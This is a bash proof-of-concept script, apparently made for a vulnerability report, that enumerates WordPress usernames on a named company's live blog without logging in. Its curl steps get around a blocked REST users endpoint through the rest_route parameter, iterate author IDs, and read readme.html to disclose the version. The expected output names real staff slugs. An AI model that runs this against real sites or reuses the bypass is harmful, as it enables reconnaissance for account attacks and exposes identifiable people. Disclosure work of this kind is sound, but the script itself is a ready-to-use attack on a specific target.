#!/usr/bin/env bash
# PoC: ELAN Limited — Unauthenticated WordPress username enumeration
# Target: https://www.elanlimited.com/blogs/  (in-scope: www.elanlimited.com only)
# 4 read-only GET requests total. No POSTs, no auth, no modification.
# Usage:  ./poc_user_enum_elan.sh          (live run)
#         ./poc_user_enum_elan.sh --dry    (prints commands without executing)

set -u
BASE="https://www.elanlimited.com/blogs"
DRY="${1:-}"

run() {
  echo
  echo "\$ $*"
  if [ "$DRY" = "--dry" ]; then return 0; fi
  eval "$@"
}

banner() { echo; echo "=================================================="; echo "$1"; echo "=================================================="; }

banner "STEP 0: Control - REST users endpoint via pretty permalink (expected 404 = blocked)"
run "curl -s -m 15 -o /dev/null -w 'HTTP %{http_code}\n' '$BASE/wp-json/wp/v2/users'"

banner "STEP 1: BYPASS - same endpoint via index.php?rest_route= (expected 200 + user JSON)"
run "curl -s -m 15 '$BASE/index.php?rest_route=/wp/v2/users&per_page=100' | head -c 1200"
run "echo"

banner "STEP 2: Author archive ID iteration (expected 301 to /author/sandeep/ and /author/ravi-elan/)"
run "curl -s -m 15 -o /dev/null -w 'author=1: HTTP %{http_code} -> %{redirect_url}\n' '$BASE/?author=1'"
run "curl -s -m 15 -o /dev/null -w 'author=3: HTTP %{http_code} -> %{redirect_url}\n' '$BASE/?author=3'"

banner "STEP 3: WordPress version disclosure via readme.html (expected 200)"
run "curl -s -m 15 -o /dev/null -w 'readme.html: HTTP %{http_code}\n' '$BASE/readme.html'"

banner "DONE - expected outcome summary"
cat <<'EOF'
PASS criteria for the report:
  Step 0 -> 404                      (control proves a block exists)
  Step 1 -> 200 + JSON with "slug":"sandeep" and "slug":"ravi-elan"   (bypass works)
  Step 2 -> 301 -> .../author/sandeep/ and .../author/ravi-elan/       (2nd vector)
  Step 3 -> 200                      (version disclosure, optional)
EOF
